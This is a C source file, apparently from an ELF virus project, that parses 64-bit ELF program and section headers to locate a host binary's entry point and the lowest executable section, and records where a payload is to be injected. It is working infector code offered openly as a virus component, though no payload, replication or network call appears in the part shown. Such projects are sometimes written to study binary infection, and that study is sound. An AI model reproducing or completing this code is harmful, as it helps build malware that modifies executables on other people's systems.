#include "virus.h"
#include "utils.h"
#include "compiler_utils.h"
#include "errors.h"

#define is_exec_phdr(type, flags) (type == PT_LOAD && flags == (PF_R | PF_X))
#define is_exec_shdr(type, flags) (sh_type == SHT_PROGBITS && sh_flags == (SHF_ALLOC | SHF_EXECINSTR))

struct data
{
	Elf64_Phdr	*safe_entry_phdr;   // entry program header
	Elf64_Shdr	*safe_entry_shdr;   // entry section header
	Elf64_Shdr	*safe_low_shdr;     // lowest section header
	Elf64_Addr	e_entry;            // program entry
};

static bool	find_phdr(struct safe_ptr ref, const size_t offset,
			void *data)
{
	Elf64_Phdr	*seg_hdr = safe(ref, offset, sizeof(Elf64_Phdr));

	if (seg_hdr == NULL)
		return errors(ERR_FILE, _ERR_F_BAD_PHDR_OFF);

	const uint32_t		p_type  = seg_hdr->p_type;
	const uint32_t		p_flags = seg_hdr->p_flags;
	const Elf64_Addr	p_vaddr = seg_hdr->p_vaddr;
	const uint64_t		p_memsz = seg_hdr->p_memsz;

	struct data		*closure = data;
	const Elf64_Addr	e_entry  = closure->e_entry;

	if (is_exec_phdr(p_type, p_flags)
	&& p_vaddr <= e_entry && e_entry < p_vaddr + p_memsz)
	{
		closure->safe_entry_phdr = seg_hdr;
	}
	return true;
}

static bool	find_shdr(struct safe_ptr ref, const size_t offset,
			void *data)
{
	Elf64_Shdr	*sect_hdr = safe(ref, offset, sizeof(Elf64_Shdr));

	if (sect_hdr == NULL)
		return errors(ERR_FILE, _ERR_F_BAD_SHDR_OFF);

	struct data	*closure = data;

	if (!closure->safe_entry_phdr)
		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);

	const Elf64_Addr	stored_sh_addr = closure->safe_low_shdr ?
					closure->safe_low_shdr->sh_addr : ~0ull;

	const Elf64_Addr	e_entry  = closure->e_entry;
	const Elf64_Off		p_vaddr  = closure->safe_entry_phdr->p_vaddr;
	const uint64_t		p_filesz = closure->safe_entry_phdr->p_filesz;

	const Elf64_Addr	sh_addr  = sect_hdr->sh_addr;
	const uint64_t		sh_size  = sect_hdr->sh_size;
	const uint64_t		sh_flags = sect_hdr->sh_flags;
	const uint32_t		sh_type  = sect_hdr->sh_type;

	if (sh_addr <= e_entry && e_entry < sh_addr + sh_size)
	{
		closure->safe_entry_shdr = sect_hdr;
	}
	if (is_exec_shdr(sh_type, sh_flags)
	&& p_vaddr <= sh_addr && sh_addr < p_vaddr + p_filesz
	&& sh_addr < stored_sh_addr)
	{
		closure->safe_low_shdr = sect_hdr;
	}
	return true;
}

static bool	setup_entry(struct entry *entry,
			struct data *closure)
{
	Elf64_Phdr	*safe_entry_phdr = closure->safe_entry_phdr;
	Elf64_Shdr	*safe_entry_shdr = closure->safe_entry_shdr;
	Elf64_Shdr	*safe_low_shdr   = closure->safe_low_shdr;
	Elf64_Addr	e_entry          = closure->e_entry;

	if (!safe_entry_phdr || !safe_entry_shdr || !safe_low_shdr)
		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);

	const Elf64_Off		entry_sh_offset = safe_entry_shdr->sh_offset;
	const Elf64_Addr	entry_sh_addr   = safe_entry_shdr->sh_addr;

	entry->entry_offset = entry_sh_offset + (e_entry - entry_sh_addr);
	entry->entry_addr   = entry_sh_addr   + (e_entry - entry_sh_addr);

	const Elf64_Off		low_sh_offset = safe_low_shdr->sh_offset;
	const Elf64_Addr	low_sh_addr   = safe_low_shdr->sh_addr;

	entry->safe_phdr      = safe_entry_phdr;
	entry->safe_shdr      = safe_low_shdr;
	entry->payload_offset = low_sh_offset;
	entry->payload_addr   = low_sh_addr;

	if (entry->safe_phdr   == NULL || entry->safe_shdr      == NULL
	|| entry->entry_offset == 0    || entry->payload_offset == 0
	|| entry->entry_addr   == 0    || entry->payload_addr   == 0)
		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);

	return true;
}

bool		find_entry(struct entry *entry, struct safe_ptr ref)
{
	struct data	closure;
	Elf64_Ehdr	*elf_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));

	if (elf_hdr == NULL)
		return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	bzero(entry, sizeof(*entry));
	bzero(&closure, sizeof(closure));
	closure.e_entry = elf_hdr->e_entry;

	if (!foreach_phdr(ref, find_phdr, &closure)
	|| !foreach_shdr(ref, find_shdr, &closure)
	|| !setup_entry(entry, &closure))
		return errors(ERR_THROW, _ERR_T_FIND_ENTRY);

	return true;
}
